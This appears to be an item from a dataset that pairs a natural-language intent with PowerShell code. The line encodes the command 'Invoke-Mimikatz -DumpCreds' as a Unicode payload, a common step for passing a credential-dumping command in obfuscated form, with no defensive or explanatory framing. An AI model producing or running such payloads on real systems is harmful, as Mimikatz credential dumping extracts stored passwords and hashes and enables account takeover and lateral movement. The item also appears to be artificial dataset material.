# Natural language intent:
# Encode a Mimikatz command as a Unicode payload

$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds")
